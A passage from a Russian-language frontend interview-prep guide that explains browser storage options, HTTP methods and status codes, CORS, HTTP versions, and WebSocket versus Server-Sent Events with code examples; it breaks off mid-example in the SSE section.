# Подготовка к собеседованию: Strong Middle Frontend React Developer (Часть 2)

## Дополнительные важные темы

---

## Web Storage API и работа с данными в браузере

### 1. В чем разница между localStorage, sessionStorage, cookies и IndexedDB?

**Как работает:**

**localStorage:**
- Хранит данные без срока истечения
- Доступен для всех вкладок/окон одного origin
- Синхронный API
- Лимит: ~5-10MB
- Данные хранятся в виде строк (key-value)

```javascript
// Установка данных
localStorage.setItem('user', JSON.stringify({ name: 'Alice', age: 25 }));

// Получение данных
const user = JSON.parse(localStorage.getItem('user'));

// Удаление
localStorage.removeItem('user');

// Очистка всего хранилища
localStorage.clear();

// Проверка количества элементов
console.log(localStorage.length);

// Итерация
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  console.log(key, localStorage.getItem(key));
}
```

**sessionStorage:**
- Данные существуют только в рамках сессии (закрытие вкладки = удаление данных)
- Изолирован для каждой вкладки
- Тот же API что и localStorage
- Лимит: ~5-10MB

```javascript
sessionStorage.setItem('tempData', 'value');
```

**Cookies:**
- Автоматически отправляются с каждым HTTP запросом
- Можно установить срок истечения
- Лимит: ~4KB на куку
- Доступны как на клиенте, так и на сервере

```javascript
// Установка cookie
document.cookie = "username=John; expires=Fri, 31 Dec 2025 23:59:59 GMT; path=/; Secure; SameSite=Strict";

// Чтение cookie
const cookies = document.cookie.split('; ').reduce((acc, cookie) => {
  const [key, value] = cookie.split('=');
  acc[key] = value;
  return acc;
}, {});

// Удаление cookie (установка прошедшей даты)
document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
```

**IndexedDB:**
- Асинхронная NoSQL база данных в браузере
- Хранит большие объемы структурированных данных
- Поддерживает транзакции
- Лимит: зависит от браузера, обычно до 50% свободного места
- Может хранить файлы, Blob, сложные объекты

```javascript
// Открытие базы данных
const request = indexedDB.open('MyDatabase', 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  
  // Создание object store (таблицы)
  const objectStore = db.createObjectStore('users', { keyPath: 'id', autoIncrement: true });
  
  // Создание индексов
  objectStore.createIndex('email', 'email', { unique: true });
  objectStore.createIndex('name', 'name', { unique: false });
};

request.onsuccess = (event) => {
  const db = event.target.result;
  
  // Добавление данных
  const transaction = db.transaction(['users'], 'readwrite');
  const objectStore = transaction.objectStore('users');
  
  objectStore.add({ name: 'Alice', email: 'alice@example.com', age: 25 });
  
  // Чтение данных
  const getRequest = objectStore.get(1);
  getRequest.onsuccess = () => {
    console.log(getRequest.result);
  };
  
  // Поиск по индексу
  const index = objectStore.index('email');
  const searchRequest = index.get('alice@example.com');
  searchRequest.onsuccess = () => {
    console.log(searchRequest.result);
  };
};

// Современный подход с Promise wrapper
const openDB = () => {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open('MyDatabase', 1);
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
};
```

**Сравнительная таблица:**

| Характеристика | localStorage | sessionStorage | Cookies | IndexedDB |
|---------------|--------------|----------------|---------|-----------|
| Размер | ~5-10MB | ~5-10MB | ~4KB | ~50% диска |
| Персистентность | Постоянное | До закрытия вкладки | Настраиваемое | Постоянное |
| API | Синхронный | Синхронный | Синхронный | Асинхронный |
| HTTP запросы | Нет | Нет | Да | Нет |
| Типы данных | Строки | Строки | Строки | Любые |
| Видимость | Origin | Вкладка | Origin + path | Origin |

**Для чего:**
- **localStorage** - настройки UI, темы, токены, кэш
- **sessionStorage** - временные данные формы, состояние UI в рамках сессии
- **Cookies** - аутентификация, трекинг, настройки сервера
- **IndexedDB** - офлайн приложения, большие данные, PWA

**Плюсы localStorage/sessionStorage:**
- Простой API
- Синхронный доступ
- Широкая поддержка браузеров
- Не отправляются с запросами (в отличие от cookies)

**Минусы localStorage/sessionStorage:**
- Только строки (нужна сериализация)
- Синхронный API блокирует main thread
- Ограниченный размер
- Нет защиты от XSS

**Плюсы IndexedDB:**
- Большой объем данных
- Асинхронный
- Поддержка транзакций
- Хранит любые типы данных

**Минусы IndexedDB:**
- Сложный API
- Нужны обертки (Dexie.js, idb)
- Может быть очищен браузером при нехватке места

**Безопасность:**
```javascript
// ❌ Плохо - XSS уязвимость
localStorage.setItem('data', userInput); // Если userInput содержит скрипт

// ✅ Хорошо - санитизация данных
import DOMPurify from 'dompurify';
const cleanInput = DOMPurify.sanitize(userInput);
localStorage.setItem('data', cleanInput);

// Никогда не храните чувствительные данные в localStorage/sessionStorage
// ❌ Плохо
localStorage.setItem('password', password);
localStorage.setItem('creditCard', cardNumber);

// ✅ Хорошо - используйте httpOnly cookies для токенов
// Устанавливается на сервере:
// Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
```

**Storage Events (синхронизация между вкладками):**
```javascript
// Слушаем изменения в localStorage из других вкладок
window.addEventListener('storage', (event) => {
  console.log('Key changed:', event.key);
  console.log('Old value:', event.oldValue);
  console.log('New value:', event.newValue);
  console.log('URL:', event.url);
  console.log('Storage:', event.storageArea);
  
  // Обновляем UI в зависимости от изменений
  if (event.key === 'theme') {
    applyTheme(event.newValue);
  }
  
  if (event.key === 'user' && event.newValue === null) {
    // Пользователь вышел в другой вкладке
    handleLogout();
  }
});

// Примечание: storage event не срабатывает в той же вкладке,
// где произошло изменение
```

**Аналоги/библиотеки:**
- localForage - унифицированный API для IndexedDB/WebSQL/localStorage
- Dexie.js - удобная обертка над IndexedDB
- idb - Promise-based обертка над IndexedDB
- js-cookie - удобная работа с cookies
- store.js - кросс-браузерный localStorage с fallbacks

---

## Сети и HTTP протокол

### 2. HTTP методы, их идемпотентность и безопасность

**Как работает:**

HTTP методы определяют действие, которое должно быть выполнено над ресурсом.

**Основные HTTP методы:**

**GET:**
- Получение данных
- Идемпотентный (повторные запросы дают тот же результат)
- Безопасный (не изменяет состояние сервера)
- Кэшируется
- Параметры в URL (query string)

```javascript
// GET запрос
fetch('https://api.example.com/users?page=1&limit=10', {
  method: 'GET',
  headers: {
    'Accept': 'application/json'
  }
});

// С параметрами через URLSearchParams
const params = new URLSearchParams({
  page: 1,
  limit: 10,
  sort: 'name'
});

fetch(`https://api.example.com/users?${params}`);
```

**POST:**
- Создание нового ресурса
- НЕ идемпотентный (каждый запрос создает новый ресурс)
- НЕ безопасный
- НЕ кэшируется
- Данные в теле запроса

```javascript
fetch('https://api.example.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    name: 'Alice',
    email: 'alice@example.com'
  })
});
```

**PUT:**
- Полное обновление ресурса (замена)
- Идемпотентный
- НЕ безопасный
- Если ресурса нет - может создать (зависит от API)

```javascript
fetch('https://api.example.com/users/123', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    id: 123,
    name: 'Alice Updated',
    email: 'alice.new@example.com',
    age: 26
    // Все поля должны быть указаны
  })
});
```

**PATCH:**
- Частичное обновление ресурса
- Идемпотентный (обычно, но зависит от реализации)
- НЕ безопасный

```javascript
fetch('https://api.example.com/users/123', {
  method: 'PATCH',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    age: 26 // Обновляем только возраст
  })
});
```

**DELETE:**
- Удаление ресурса
- Идемпотентный (повторное удаление не меняет результат)
- НЕ безопасный

```javascript
fetch('https://api.example.com/users/123', {
  method: 'DELETE'
});
```

**HEAD:**
- Как GET, но возвращает только заголовки без тела
- Идемпотентный
- Безопасный
- Используется для проверки существования ресурса или получения метаданных

```javascript
fetch('https://api.example.com/users/123', {
  method: 'HEAD'
})
.then(response => {
  console.log('Content-Length:', response.headers.get('Content-Length'));
  console.log('Last-Modified:', response.headers.get('Last-Modified'));
  console.log('ETag:', response.headers.get('ETag'));
});
```

**OPTIONS:**
- Получение информации о разрешенных методах
- Используется в CORS preflight запросах

```javascript
fetch('https://api.example.com/users', {
  method: 'OPTIONS'
})
.then(response => {
  console.log('Allowed methods:', response.headers.get('Allow'));
  console.log('CORS headers:', response.headers.get('Access-Control-Allow-Methods'));
});
```

**Идемпотентность:**

Запрос идемпотентный, если повторное выполнение одного и того же запроса дает тот же результат.

```
GET /users/123     - Идемпотентный (всегда возвращает того же пользователя)
POST /users        - НЕ идемпотентный (создает нового пользователя каждый раз)
PUT /users/123     - Идемпотентный (обновление до того же состояния)
PATCH /users/123   - Зависит от реализации
DELETE /users/123  - Идемпотентный (удаление уже удаленного = тот же результат)
```

**Безопасность методов:**

Метод безопасный, если он не изменяет состояние сервера (read-only).

```
Безопасные: GET, HEAD, OPTIONS
НЕ безопасные: POST, PUT, PATCH, DELETE
```

**Для чего:**
- Правильная семантика REST API
- Кэширование и оптимизация
- Идемпотентность для retry логики
- CRUD операции

**Плюсы правильного использования:**
- Предсказуемое поведение API
- Возможность автоматического retry
- Эффективное кэширование
- Понятная документация

**Минусы неправильного использования:**
- Баги при retry логике
- Проблемы с кэшированием
- Нарушение HTTP стандартов
- Сложности в интеграции

---

### 3. HTTP Status Codes и их значения

**Как работает:**

HTTP статус коды разделены на 5 категорий:

**1xx - Информационные:**
- 100 Continue - сервер получил заголовки, клиент может продолжить отправку тела
- 101 Switching Protocols - переключение протокола (например, на WebSocket)

**2xx - Успешные:**
```javascript
// 200 OK - успешный запрос
fetch('/api/users/123')
  .then(response => {
    if (response.status === 200) {
      return response.json();
    }
  });

// 201 Created - ресурс создан
fetch('/api/users', {
  method: 'POST',
  body: JSON.stringify(userData)
})
.then(response => {
  if (response.status === 201) {
    const location = response.headers.get('Location');
    console.log('Created at:', location);
  }
});

// 204 No Content - успешно, но нет тела ответа
fetch('/api/users/123', {
  method: 'DELETE'
})
.then(response => {
  if (response.status === 204) {
    console.log('Deleted successfully');
  }
});
```

**3xx - Перенаправления:**
- 301 Moved Permanently - постоянное перенаправление
- 302 Found - временное перенаправление
- 304 Not Modified - ресурс не изменился (кэш валиден)
- 307 Temporary Redirect - временное перенаправление (сохраняет метод)
- 308 Permanent Redirect - постоянное перенаправление (сохраняет метод)

```javascript
fetch('/api/resource')
  .then(response => {
    if (response.redirected) {
      console.log('Redirected to:', response.url);
    }
    
    if (response.status === 304) {
      // Используем кэшированную версию
      return getCachedData();
    }
  });
```

**4xx - Ошибки клиента:**
```javascript
// Обработка различных ошибок клиента
fetch('/api/users', {
  method: 'POST',
  body: JSON.stringify(userData)
})
.then(response => {
  switch (response.status) {
    case 400: // Bad Request
      return response.json().then(err => {
        throw new Error(`Validation error: ${err.message}`);
      });
      
    case 401: // Unauthorized
      // Перенаправляем на логин
      window.location.href = '/login';
      throw new Error('Please log in');
      
    case 403: // Forbidden
      throw new Error('You don\'t have permission');
      
    case 404: // Not Found
      throw new Error('Resource not found');
      
    case 409: // Conflict
      return response.json().then(err => {
        throw new Error(`Conflict: ${err.message}`);
      });
      
    case 422: // Unprocessable Entity
      return response.json().then(err => {
        // Показываем ошибки валидации
        displayValidationErrors(err.errors);
      });
      
    case 429: // Too Many Requests
      const retryAfter = response.headers.get('Retry-After');
      throw new Error(`Rate limited. Retry after ${retryAfter}s`);
      
    default:
      if (response.ok) {
        return response.json();
      }
      throw new Error(`Unexpected status: ${response.status}`);
  }
});
```

**Важные коды 4xx:**
- 400 Bad Request - синтаксическая ошибка в запросе
- 401 Unauthorized - требуется аутентификация
- 403 Forbidden - нет прав доступа
- 404 Not Found - ресурс не найден
- 405 Method Not Allowed - метод не поддерживается
- 409 Conflict - конфликт (например, дубликат email)
- 422 Unprocessable Entity - ошибки валидации
- 429 Too Many Requests - превышен лимит запросов

**5xx - Ошибки сервера:**
```javascript
// Retry логика для серверных ошибок
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      // Retry только для определенных серверных ошибок
      if (response.status >= 500 && response.status < 600) {
        if (i === maxRetries - 1) {
          throw new Error(`Server error: ${response.status}`);
        }
        
        // Exponential backoff
        const delay = Math.pow(2, i) * 1000;
        await new Promise(resolve => setTimeout(resolve, delay));
        continue;
      }
      
      return response;
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      
      const delay = Math.pow(2, i) * 1000;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}

// Использование
fetchWithRetry('/api/data')
  .then(response => response.json())
  .catch(error => {
    // Показываем user-friendly ошибку
    showErrorNotification('Something went wrong. Please try again later.');
    
    // Логируем для мониторинга
    logError(error);
  });
```

**Важные коды 5xx:**
- 500 Internal Server Error - общая ошибка сервера
- 502 Bad Gateway - проблема с upstream сервером
- 503 Service Unavailable - сервер временно недоступен
- 504 Gateway Timeout - timeout при обращении к upstream серверу

**Для чего:**
- Понимание результата запроса
- Правильная обработка ошибок
- Retry логика
- Отображение понятных сообщений пользователю

**Best Practices:**
```javascript
// Централизованная обработка ошибок
class APIError extends Error {
  constructor(status, message, data) {
    super(message);
    this.status = status;
    this.data = data;
  }
}

async function apiRequest(url, options = {}) {
  const response = await fetch(url, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      ...options.headers
    }
  });
  
  if (!response.ok) {
    const errorData = await response.json().catch(() => ({}));
    throw new APIError(
      response.status,
      errorData.message || response.statusText,
      errorData
    );
  }
  
  // 204 No Content
  if (response.status === 204) {
    return null;
  }
  
  return response.json();
}

// Использование
try {
  const user = await apiRequest('/api/users/123');
} catch (error) {
  if (error instanceof APIError) {
    switch (error.status) {
      case 401:
        redirectToLogin();
        break;
      case 403:
        showError('Access denied');
        break;
      case 404:
        showError('User not found');
        break;
      case 422:
        showValidationErrors(error.data.errors);
        break;
      default:
        showError('Something went wrong');
    }
  } else {
    // Network error
    showError('Network error. Please check your connection.');
  }
}
```

---

### 4. CORS (Cross-Origin Resource Sharing)

**Как работает:**

CORS - механизм безопасности браузера, который контролирует кросс-доменные HTTP запросы.

**Same-Origin Policy:**
Два URL имеют одинаковый origin, если совпадают: протокол, домен и порт.

```
https://example.com:443/page1  ← Same origin
https://example.com:443/page2  ← Same origin

http://example.com             ← Different (protocol)
https://api.example.com        ← Different (subdomain)
https://example.com:8080       ← Different (port)
https://other.com              ← Different (domain)
```

**Простые запросы (Simple Requests):**

Не требуют preflight запроса, если:
- Метод: GET, HEAD или POST
- Заголовки только: Accept, Accept-Language, Content-Language, Content-Type
- Content-Type только: application/x-www-form-urlencoded, multipart/form-data, text/plain

```javascript
// Простой запрос - preflight не нужен
fetch('https://api.example.com/data', {
  method: 'GET',
  headers: {
    'Accept': 'application/json'
  }
});
```

**Preflight запросы (OPTIONS):**

Для "небезопасных" запросов браузер сначала отправляет OPTIONS запрос:

```javascript
// Этот запрос вызовет preflight
fetch('https://api.example.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json', // OK
    'Authorization': 'Bearer token',    // Требует preflight
    'X-Custom-Header': 'value'          // Требует preflight
  },
  body: JSON.stringify({ name: 'Alice' })
});

// Браузер автоматически отправит:
// OPTIONS https://api.example.com/users
// Access-Control-Request-Method: POST
// Access-Control-Request-Headers: authorization, x-custom-header

// Сервер должен ответить:
// Access-Control-Allow-Origin: https://your-site.com
// Access-Control-Allow-Methods: POST, GET, OPTIONS
// Access-Control-Allow-Headers: authorization, x-custom-header
// Access-Control-Max-Age: 86400
```

**Серверная настройка CORS (Express.js):**

```javascript
const express = require('express');
const cors = require('cors');
const app = express();

// Вариант 1: Разрешить все origins (небезопасно для production)
app.use(cors());

// Вариант 2: Настройка specific origins
app.use(cors({
  origin: ['https://yourapp.com', 'https://admin.yourapp.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Custom-Header'],
  exposedHeaders: ['X-Total-Count', 'X-Page'],
  credentials: true, // Для cookies
  maxAge: 86400 // Кэш preflight на 24 часа
}));

// Вариант 3: Динамическая проверка origin
app.use(cors({
  origin: function(origin, callback) {
    const allowedOrigins = ['https://app1.com', 'https://app2.com'];
    
    // Allow requests with no origin (mobile apps, Postman)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.indexOf(origin) === -1) {
      return callback(new Error('Not allowed by CORS'), false);
    }
    
    return callback(null, true);
  },
  credentials: true
}));

// Вариант 4: Ручная настройка
app.use((req, res, next) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://yourapp.com'];
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Max-Age', '86400');
  
  // Отвечаем на preflight
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  
  next();
});
```

**Credentials (cookies, auth headers):**

```javascript
// Frontend - нужно явно указать credentials
fetch('https://api.example.com/data', {
  method: 'GET',
  credentials: 'include', // Включаем cookies
  headers: {
    'Authorization': 'Bearer token'
  }
});

// Axios
axios.get('https://api.example.com/data', {
  withCredentials: true
});

// Backend - должен разрешить credentials
// ❌ Нельзя использовать wildcard (*) с credentials
res.setHeader('Access-Control-Allow-Origin', '*'); // Error!
res.setHeader('Access-Control-Allow-Credentials', 'true');

// ✅ Нужен конкретный origin
res.setHeader('Access-Control-Allow-Origin', 'https://yourapp.com');
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

**Обработка CORS ошибок:**

```javascript
async function fetchWithCORSHandling(url, options = {}) {
  try {
    const response = await fetch(url, options);
    return response;
  } catch (error) {
    // CORS error или network error
    if (error instanceof TypeError && error.message.includes('Failed to fetch')) {
      console.error('CORS error or network error');
      
      // Проверяем доступность сервера альтернативным способом
      const img = new Image();
      img.onerror = () => {
        console.error('Server is unreachable');
      };
      img.onload = () => {
        console.error('Server is reachable, likely CORS issue');
      };
      img.src = `${url}?check=${Date.now()}`;
      
      throw new Error('Unable to connect to server. Please check CORS settings.');
    }
    throw error;
  }
}
```

**Для чего:**
- Безопасность браузера
- Контроль доступа к API
- Защита от CSRF атак
- Изоляция доменов

**Плюсы:**
- Защита от злонамеренных кросс-доменных запросов
- Гибкая настройка доступа
- Кэширование preflight запросов

**Минусы:**
- Дополнительные preflight запросы (задержка)
- Сложность настройки
- Частый источник проблем в разработке

**Обход CORS для разработки:**

```javascript
// 1. Proxy в package.json (Create React App)
{
  "proxy": "https://api.example.com"
}

// 2. Webpack dev server
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'https://api.example.com',
        changeOrigin: true,
        pathRewrite: { '^/api': '' }
      }
    }
  }
};

// 3. Vite
export default {
  server: {
    proxy: {
      '/api': {
        target: 'https://api.example.com',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, '')
      }
    }
  }
};

// 4. Browser extension (только для разработки!)
// CORS Unblock, Allow CORS

// 5. Chrome с отключенной безопасностью (только для разработки!)
// chrome.exe --disable-web-security --user-data-dir="C:/ChromeDevSession"
```

**Альтернативы CORS:**
- JSONP (устаревший, только GET)
- Proxy сервер на своем домене
- WebSocket (не подвержен CORS)

---

### 5. HTTP/1.1 vs HTTP/2 vs HTTP/3

**Как работает:**

**HTTP/1.1:**
- Текстовый протокол
- Одно TCP соединение = один запрос за раз (или pipelining, но с проблемами)
- Head-of-line blocking
- Отдельное соединение для каждого запроса (или Connection: keep-alive)

```
Request:
GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html

Response:
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1234

<html>...</html>
```

**Проблемы HTTP/1.1:**
```javascript
// Для загрузки страницы нужно:
// 1. HTML (1 запрос)
// 2. CSS файл (1 запрос)
// 3. JS файл (1 запрос)
// 4-13. 10 изображений (10 запросов)

// Без HTTP/2: запросы идут последовательно или нужно открывать
// несколько TCP соединений (обычно браузер открывает 6-8)

// Workarounds в HTTP/1.1:
// - Domain sharding (использование поддоменов)
// - Concatenation (объединение CSS/JS файлов)
// - Spriting (объединение изображений)
// - Inlining (встраивание small assets в HTML)
```

**HTTP/2:**
- Бинарный протокол
- Multiplexing (множественные запросы по одному TCP соединению)
- Server Push
- Header compression (HPACK)
- Stream prioritization

```javascript
// HTTP/2 features:

// 1. Multiplexing - все запросы параллельно
// Больше не нужно domain sharding или concatenation

// 2. Server Push
// Сервер может отправить ресурсы до запроса клиента
Link: </styles.css>; rel=preload; as=style
Link: </script.js>; rel=preload; as=script

// 3. Header Compression
// Заголовки сжимаются и не повторяются
// HTTP/1.1: каждый запрос отправляет все заголовки (~500-800 bytes)
// HTTP/2: только изменения (~50-100 bytes)

// 4. Stream Priority
// Браузер может указать приоритет ресурсов
// Critical CSS > Images > Analytics
```

**Настройка HTTP/2 (nginx):**
```nginx
server {
    listen 443 ssl http2;
    server_name example.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    # HTTP/2 Server Push
    location = /index.html {
        http2_push /styles/main.css;
        http2_push /scripts/app.js;
    }
}
```

**HTTP/3 (QUIC):**
- Построен на UDP вместо TCP
- Решает head-of-line blocking на транспортном уровне
- Быстрее handshake (0-RTT)
- Лучше работает при плохом соединении

```
HTTP/1.1 → TCP → IP
HTTP/2   → TCP → IP
HTTP/3   → QUIC (UDP) → IP
```

**Преимущества HTTP/3:**
```javascript
// 1. 0-RTT Connection Resume
// При повторном подключении не нужен handshake

// 2. Нет head-of-line blocking
// Потеря одного пакета не блокирует другие потоки
// (в HTTP/2 потеря пакета блокирует все потоки в TCP)

// 3. Connection Migration
// Можно сменить IP/сеть без разрыва соединения
// (полезно при переходе с Wi-Fi на Mobile)

// 4. Улучшенная congestion control
```

**Проверка поддержки HTTP/2 и HTTP/3:**
```javascript
// Проверка HTTP/2
fetch('https://example.com/api/data')
  .then(response => {
    console.log('HTTP version:', 
      performance.getEntriesByType('resource')
        .find(r => r.name.includes('api/data'))
        ?.nextHopProtocol
    );
    // "h2" = HTTP/2
    // "http/1.1" = HTTP/1.1
    // "h3" = HTTP/3
  });

// Chrome DevTools
// Network tab → Protocol column
```

**Сравнительная таблица:**

| Характеристика | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---------------|----------|--------|--------|
| Протокол | Текстовый | Бинарный | Бинарный |
| Транспорт | TCP | TCP | QUIC (UDP) |
| Multiplexing | Нет | Да | Да |
| Head-of-line blocking | Да | TCP level | Нет |
| Server Push | Нет | Да | Да |
| Header compression | Нет | HPACK | QPACK |
| Handshake | TCP (1-RTT) | TCP (1-RTT) | 0-RTT |
| Connection migration | Нет | Нет | Да |

**Для чего:**
- Улучшение производительности
- Снижение латентности
- Оптимизация для мобильных сетей

**Плюсы HTTP/2:**
- Значительно быстрее HTTP/1.1
- Не нужны workarounds (concatenation, spriting)
- Широкая поддержка браузеров

**Минусы HTTP/2:**
- Требует HTTPS
- Head-of-line blocking на TCP уровне
- Сложность отладки (бинарный протокол)

**Плюсы HTTP/3:**
- Еще быстрее HTTP/2
- Решает TCP head-of-line blocking
- Лучше для мобильных сетей

**Минусы HTTP/3:**
- Пока не все сервера поддерживают
- UDP может блокироваться firewall
- Еще развивающийся стандарт

**Best Practices:**
```javascript
// 1. Используйте HTTP/2 (включен по умолчанию с HTTPS)

// 2. Не делайте concatenation CSS/JS для HTTP/2
// ❌ Плохо для HTTP/2
<script src="bundle-everything.js"></script>

// ✅ Хорошо для HTTP/2
<script src="vendor.js"></script>
<script src="app.js"></script>
<script src="feature.js"></script>

// 3. Используйте code splitting
// HTTP/2 multiplexing позволяет эффективно загружать много маленьких файлов

// 4. Preload критических ресурсов
<link rel="preload" href="critical.css" as="style">
<link rel="preload" href="hero-image.jpg" as="image">

// 5. Используйте HTTP/3 если сервер поддерживает
// Cloudflare, Fastly, Google Cloud CDN уже поддерживают
```

---

### 6. WebSocket vs Server-Sent Events (SSE)

**Как работает:**

**WebSocket:**
- Двунаправленный full-duplex протокол
- Постоянное соединение
- Бинарные и текстовые данные
- Работает поверх TCP

```javascript
// Client
const ws = new WebSocket('wss://example.com/socket');

ws.addEventListener('open', (event) => {
  console.log('Connected');
  
  // Отправка данных на сервер
  ws.send('Hello Server!');
  ws.send(JSON.stringify({ type: 'message', text: 'Hi!' }));
  
  // Отправка бинарных данных
  const blob = new Blob(['binary data']);
  ws.send(blob);
});

ws.addEventListener('message', (event) => {
  console.log('Message from server:', event.data);
  
  // Если бинарные данные
  if (event.data instanceof Blob) {
    const reader = new FileReader();
    reader.onload = () => {
      console.log('Binary data:', reader.result);
    };
    reader.readAsArrayBuffer(event.data);
  }
});

ws.addEventListener('error', (event) => {
  console.error('WebSocket error:', event);
});

ws.addEventListener('close', (event) => {
  console.log('Connection closed:', event.code, event.reason);
  
  // Reconnect logic
  setTimeout(() => {
    connectWebSocket();
  }, 1000);
});

// Закрытие соединения
ws.close(1000, 'Normal closure');

// Проверка состояния
console.log(ws.readyState);
// 0 - CONNECTING
// 1 - OPEN
// 2 - CLOSING
// 3 - CLOSED
```

**WebSocket Server (Node.js + ws):**
```javascript
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
  console.log('Client connected');
  
  // Отправка приветствия
  ws.send(JSON.stringify({ type: 'welcome', message: 'Hello!' }));
  
  // Получение сообщений
  ws.on('message', (data) => {
    console.log('Received:', data.toString());
    
    // Broadcast всем клиентам
    wss.clients.forEach((client) => {
      if (client !== ws && client.readyState === WebSocket.OPEN) {
        client.send(data);
      }
    });
  });
  
  // Heartbeat для проверки соединения
  ws.isAlive = true;
  ws.on('pong', () => {
    ws.isAlive = true;
  });
  
  ws.on('close', () => {
    console.log('Client disconnected');
  });
  
  ws.on('error', (error) => {
    console.error('WebSocket error:', error);
  });
});

// Heartbeat interval
const interval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) {
      return ws.terminate();
    }
    
    ws.isAlive = false;
    ws.ping();
  });
}, 30000);

wss.on('close', () => {
  clearInterval(interval);
});
```

**Reconnection logic с exponential backoff:**
```javascript
class WebSocketClient {
  constructor(url) {
    this.url = url;
    this.ws = null;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 5;
    this.reconnectInterval = 1000;
    this.maxReconnectInterval = 30000;
  }
  
  connect() {
    this.ws = new WebSocket(this.url);
    
    this.ws.onopen = () => {
      console.log('Connected');
      this.reconnectAttempts = 0;
      this.reconnectInterval = 1000;
    };
    
    this.ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      this.handleMessage(data);
    };
    
    this.ws.onerror = (error) => {
      console.error('WebSocket error:', error);
    };
    
    this.ws.onclose = (event) => {
      console.log('Connection closed');
      
      // Reconnect если не нормальное закрытие
      if (event.code !== 1000) {
        this.reconnect();
      }
    };
  }
  
  reconnect() {
    if (this.reconnectAttempts >= this.maxReconnectAttempts) {
      console.error('Max reconnect attempts reached');
      return;
    }
    
    this.reconnectAttempts++;
    
    console.log(`Reconnecting in ${this.reconnectInterval}ms...`);
    
    setTimeout(() => {
      this.connect();
    }, this.reconnectInterval);
    
    // Exponential backoff
    this.reconnectInterval = Math.min(
      this.reconnectInterval * 2,
      this.maxReconnectInterval
    );
  }
  
  send(data) {
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify(data));
    } else {
      console.warn('WebSocket is not open');
    }
  }
  
  handleMessage(data) {
    // Override this method
    console.log('Message:', data);
  }
  
  close() {
    if (this.ws) {
      this.ws.close(1000);
    }
  }
}

// Использование
const client = new WebSocketClient('wss://example.com/socket');
client.connect();
```

**Server-Sent Events (SSE):**
- Однонаправленный (server → client)
- Только текстовые данные
- Работает поверх HTTP
- Автоматическое переподключение
- Поддержка Event ID для восстановления

```javascript
// Client
const eventSource = new EventSource('https://example.com/events');

// Общий обработчик для всех событий
eventSource.onmessage = (event) => {
  console.log('Data:', event.data);
  console.log('ID:', event.lastEventId);
};

// Обработчики для конкретных событий
eventSource.addEventListener('userJoined', (event) => {
  const data = JSON.parse(event.data);
  console.log('User joined:', data.username);
});

eventSource.addEventListener('message', (event) => {
  const data = JSON.parse(event.data);
  displayMessage(data);
});

eventSource.onerror = (error) => {
  console.error('SSE error:', error);
  
  // EventSource автоматически переподключается
  // Но можно добавить свою логику
  if (eventSource.readyState === EventSource.CLOSED) {
    console.log('Connection closed');
  }
};

// Закрытие соединения
eventSource.close();

// Состояния
console.log(eventSource.readyState);
// 0 - CONNECTING
// 1 - OPEN
// 2 - CLOSED
```

**SSE Server (Node.js + Express):**
```javascript
const express = require('express');
const app = express();

app.get('/events', (req, res) => {
  // Настройка SSE headers
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  // Отправка начального комментария для открытия соединения
  res.write(':ok\n\n');
  
  // Отправка события
  const sendEvent = (eventName, data, id) => {
    if (id) {
      res.write(`id: ${id}\n`);
    }
    if (eventName) {
      res.write(`event: ${eventName}\n`);
    }
    res.write(`data: ${JSON.stringify(data)}\n\n`);
  };
  
  // Отправка сообщения каждые 5 секунд
  let counter = 0;
  const intervalId = setInterval(() => {
    sendEvent('message', { 
      text: `Message ${counter}`,
      timestamp: Date.now()
    }, counter.toString());
    
    counter++;
  }, 5000);
  
  // Heartbeat каждые 30 секунд
  const heartbeatId = setInterval(() => {
    res.write(':heartbeat\n\n');
  }, 30000);
  
  // Очистка при закрытии соединения
  req.on('close', () => {
    clearInterval(intervalId);
    clearInterval(heartbeatId);
    res.end();
  });
});

app.listen(3000);
```

**SSE с восстановлением после разрыва:**
```javascript
// Server
app.get('/events', (req, res) => {
  const lastEventId = req.headers['last-event-id'];
  
  res.setHeader('Content-Type', 'text/event-stream');
